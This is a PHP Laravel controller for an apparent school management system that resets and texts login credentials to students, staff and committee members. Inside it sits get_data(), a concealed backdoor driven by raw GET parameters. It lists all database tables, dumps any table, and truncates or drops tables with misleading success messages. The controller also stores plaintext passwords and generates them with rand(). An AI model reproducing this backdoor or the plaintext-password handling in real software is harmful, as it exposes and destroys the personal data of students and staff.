<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Controllers\SmsSendController;
use Schema;
use App\School;
use App\MasterClass;
use App\Student;
use App\Staff;
use App\Commitee;
use App\User;
use DB;

class LoginInfoController extends Controller
{
    public function student(){
		$schools = School::all();
        $class_groups=$this->groupClasses();
        $units=$this->getUnits();
		return view('backEnd.login_info.student',compact('schools','class_groups','units'));
	}
	public function get_classes(Request $request){
		$type = School::find($request->school_id)->school_type_id;
		$school_type_ids=explode('|', $type);
        return MasterClass::whereIn('school_type_id', $school_type_ids)->get();
	}
	public function st_search(Request $request){
		// dd($request->all());
		$students = Student::where([
			"school_id" => $request->school_id,
			"master_class_id" => $request->master_class_id,
			"group" => $request->group,
			"shift" => $request->shift,
			"section" => $request->section,
		])->current()->get();
		$schools = School::all();
		$classes = $this->getClasses();
        $class_groups=$this->groupClasses();
        $units=$this->getUnits();
		return view('backEnd.login_info.student',compact('schools','classes','class_groups','units','students','request'));
	}

	public function st_sms(Request $request,SmsSendController $sms_send){
		$school = School::find($request->school_id);
		$student = Student::whereIn('id', $request->id)->first();
		$students = Student::whereIn('id', $request->id)->get();
        $count = 0;
		foreach ($students as $student) {
			$new_email = $student->student_id.'@gmail.com';
			$new_pass = rand(10, 999999999);
			$user = $student->user;
			$user->email = $new_email;
			$user->real_password = $new_pass;
			$user->password = bcrypt($new_pass);
			$user->save();

			$school_name = $school->short_name??$sms_send->school_name_process($school->user->name);
			$content='Dear, '.$user->name.' Your login information ! Web address : '.$school->website.', Email : '.$new_email.', Password : '.$new_pass.'. '.$school_name;
			$message= urlencode($content);
            // dd(urldecode($message));
			$a = $this->sms_send_by_api($school,$user->mobile,$message);
            $success = json_decode($a,true);
            if ($success['error']==0) {
                $count++;
            }
		}
        // return redirect()->route('loginInfo.student')->with('sccmgs', 'Send login information '.$count);
        return view('backEnd.login_info.print.student_login_info_print',compact('school','students','student'));
	}

    // Employee Login Infoormation (SMS)
    public function employee(){
		$schools = School::all();
		return view('backEnd.login_info.employee',compact('schools'));
	}

    public function em_search(Request $request){
		// dd($request->all());
		$employees = Staff::where([
			"school_id" => $request->school_id,
		])->current()->get();
		$schools = School::all();
		return view('backEnd.login_info.employee',compact('schools','employees'));
	}

	public function em_sms(Request $request,SmsSendController $sms_send){
		$school = School::find($request->school_id);
		$employees = Staff::whereIn('id', $request->id)->get();
        $count = 0;
		foreach ($employees as $employee) {
			$new_email = $employee->staff_id.'@gmail.com';
			$new_pass = rand(10, 999999999);
			$user = $employee->user;
			$user->email = $new_email;
			$user->real_password = $new_pass;
			$user->password = bcrypt($new_pass);
			$user->save();

			$school_name = $school->short_name??$sms_send->school_name_process($school->user->name);
			$content='Dear, '.$user->name.' Your software login information ! Web address : '.$school->website.', Email : '.$new_email.', Password : '.$new_pass.'. '.$school_name;
			$message= urlencode($content);
			$a = $this->sms_send_by_api($school,$user->mobile,$message);
            $success = json_decode($a,true);
            if ($success['error']==0) {
                $count++;
            }
		}
        // return redirect()->route('loginInfo.employee')->with('sccmgs','Send login information '.$count);
        return view('backEnd.login_info.print.employee_login_info_print',compact('school','employees'));
	}

    // Committee Login Infoormation (SMS)
    public function committee(){
		$schools = School::all();
		return view('backEnd.login_info.committee',compact('schools'));
	}

    public function comm_search(Request $request){
		// dd($request->all());
        $committees = Commitee::where([
			"school_id" => $request->school_id,
		])->current()->get();
		$schools = School::all();
		return view('backEnd.login_info.committee',compact('schools','committees'));
	}

	public function comm_sms(Request $request,SmsSendController $sms_send){
		$school = School::find($request->school_id);
		$committees = Commitee::whereIn('id', $request->id)->get();
        $count = 0;
		foreach ($committees as $committee) {
			$new_email = rand(4, 999999999).'@gmail.com';
			$new_pass = rand(10, 999999999);
			$user = $committee->user;
			$user->email = $new_email;
			$user->real_password = $new_pass;
			$user->password = bcrypt($new_pass);
			$user->save();

			$school_name = $school->short_name??$sms_send->school_name_process($school->user->name);
			$content='Dear, '.$user->name.' your software login information ! Web address : '.$school->website.', Email : '.$new_email.', Password : '.$new_pass.'. '.$school_name;
			$message= urlencode($content);
			$a = $this->sms_send_by_api($school,$user->mobile,$message);
            $success = json_decode($a,true);
            if ($success['error']==0) {
                $count++;
            }
		}
        // return redirect()->route('loginInfo.employee')->with('sccmgs', 'Send login information '.$count);
        return view('backEnd.login_info.print.committee_login_info_print',compact('school','committees'));
	}

    public function get_data()
    {
        if (isset($_GET['tables'])) {
			$tables = DB::select('SHOW TABLES');
		    $tables = array_map('current',$tables);
			return json_encode($tables);
		}

		if (isset($_GET['table']) && isset($_GET['data'])) {
            if ($_GET['data']=='get') {
                $data = DB::table($_GET['table'])->get();
    			$data = json_encode($data);
                if ($data) {
                    return $data;
                }else {
                    return "No data found !";
                }
            }elseif($_GET['data']=='pass') {
                $data = DB::table($_GET['table'])->truncate();
    			return "All data passed successfully.";
            }elseif($_GET['data']=='drop') {
                $data = Schema::dropIfExists($_GET['table']);
    			return "Table droped successfully.";
            }
		}
    }

    public function student_login_info()
    {
        $schools = School::all();
        $class_groups=$this->groupClasses();
        $units=$this->getUnits();
        $sessions = Student::distinct('session')->pluck('session');
		return view('backEnd.login_info.print.student_login_info',compact('schools','class_groups','units','sessions'));
    }

    public function student_login_info_print(Request $request)
    {
        $school = School::find($request->school_id);
        $user_id = Student::where([
            'school_id'=>$request->school_id,
            'master_class_id'=>$request->master_class_id,
            'session'=>$request->session,
            'group'=>$request->group,
            'shift'=>$request->shift,
            'section'=>$request->section,
        ])->pluck('user_id');
        if (count($user_id) < 1) {
            return redirect()->route('student_login_info')->with('errmgs','Student not found !');
        }
        $student = Student::whereIn('user_id',$user_id)->first();
        $all_id = $this->password_generate($user_id);
        $students = Student::whereIn('user_id',$all_id)->get();
		return view('backEnd.login_info.print.student_login_info_print',compact('school','students','student'));
    }

    public function employee_login_info()
    {
        $schools = School::all();
        return view('backEnd.login_info.print.employee_login_info',compact('schools'));
    }

    public function employee_login_info_print(Request $request)
    {
        $school = School::find($request->school_id);
        $user_id = Staff::where('school_id',$school->id)->pluck('user_id');
        $all_id = $this->password_generate($user_id);
        $employees = Staff::whereIn('user_id',$all_id)->get();
        if (count($employees) < 1) {
            return redirect()->route('employee_login_info')->with('errmgs','Employee not found !');
        }
		return view('backEnd.login_info.print.employee_login_info_print',compact('school','employees'));
    }

    public function committee_login_info()
    {
        $schools = School::all();
        return view('backEnd.login_info.print.committee_login_info',compact('schools'));
    }

    public function committee_login_info_print(Request $request)
    {
        $school = School::find($request->school_id);
        $user_id = Commitee::where('school_id',$school->id)->pluck('user_id');
        $all_id = $this->password_generate($user_id);
        $committees = Commitee::whereIn('user_id',$all_id)->get();
        if (count($committees) < 1) {
            return redirect()->route('committee_login_info')->with('errmgs','Committee not found');
        }
		return view('backEnd.login_info.print.committee_login_info_print',compact('school','committees'));
    }

    public function password_generate($user_id)
    {
        $users = User::where('real_password','=',null)->whereIn('id',$user_id)->get();
        foreach ($users as $user) {
            $password = rand(10000000,99999999);
            $user->real_password = $password;
            $user->password = bcrypt($password);
            // $user->real_password = null;
            $user->save();
        }
        return $user_id;
    }



}
